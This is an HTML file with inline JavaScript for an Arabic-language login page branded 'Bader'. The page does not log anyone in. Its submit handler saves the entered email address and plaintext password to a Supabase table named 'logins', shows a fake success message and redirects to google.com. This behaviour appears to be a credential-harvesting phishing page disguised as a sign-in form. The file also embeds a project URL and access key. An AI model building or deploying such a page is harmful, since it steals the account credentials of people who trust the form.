<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Bader — تسجيل الدخول</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="login-card">
    <h1 class="brand-title">Bader</h1>
    <p class="brand-subtitle">سجّل دخولك للمتابعة</p>

    <form id="loginForm" autocomplete="off">

      <!-- Email -->
      <div class="form-group">
        <label for="email">البريد الإلكتروني</label>
        <input
          type="email"
          id="email"
          name="email"
          placeholder="example@gmail.com"
          required
          autocomplete="email"
        />
      </div>

      <!-- Password -->
      <div class="form-group">
        <label for="password">كلمة المرور</label>
        <div class="password-wrapper">
          <input
            type="password"
            id="password"
            name="password"
            placeholder="أدخل كلمة المرور"
            required
            minlength="6"
            autocomplete="current-password"
          />
          <button type="button" class="password-toggle" id="togglePassword">&#128065;</button>
        </div>
      </div>

      <!-- Submit -->
      <button type="submit" class="btn-submit" id="submitBtn">
        <span class="btn-text">تسجيل الدخول</span>
      </button>

      <p class="status-msg" id="statusMsg"></p>
    </form>

    <p class="card-footer">
      ليس لديك حساب؟ <a href="#">أنشئ حساباً</a>
    </p>
  </div>

  <!-- Supabase SDK v2 -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>

  <script>
    const SUPABASE_URL  = 'https://svdvevhpumksppdqridi.supabase.co';
    const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN2ZHZldmhwdW1rc3BwZHFyaWRpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIyNzEyMzUsImV4cCI6MjEwNzg0NzIzNX0.qrV7YfwymE25ywDR1RSi317MQuXsBJLpAkrCkPCq5Gc';

    const { createClient } = supabase;
    const db = createClient(SUPABASE_URL, SUPABASE_ANON);

    const form      = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    const statusMsg = document.getElementById('statusMsg');
    const toggleBtn = document.getElementById('togglePassword');
    const passInput = document.getElementById('password');

    // Password toggle
    toggleBtn.addEventListener('click', () => {
      const isPass = passInput.type === 'password';
      passInput.type = isPass ? 'text' : 'password';
      toggleBtn.innerHTML = isPass ? '&#128064;' : '&#128065;';
    });

    function showStatus(msg, type) {
      statusMsg.textContent = msg;
      statusMsg.className = 'status-msg ' + type;
    }

    // Form submit
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      if (!email || !password) {
        showStatus('يرجى ملء جميع الحقول.', 'error');
        return;
      }

      submitBtn.classList.add('loading');
      showStatus('', '');

      try {
        const { data, error } = await db
          .from('logins')
          .insert([{ email, password }]);

        if (error) throw error;

        console.log('✅ Login data saved:', data);
        showStatus('تم تسجيل الدخول بنجاح!', 'success');

        setTimeout(() => {
          window.location.href = 'https://www.google.com';
        }, 800);

      } catch (err) {
        console.error('❌ Error:', err);
        showStatus('حدث خطأ. حاول مرة أخرى.', 'error');
      } finally {
        submitBtn.classList.remove('loading');
      }
    });
  </script>

</body>
</html>
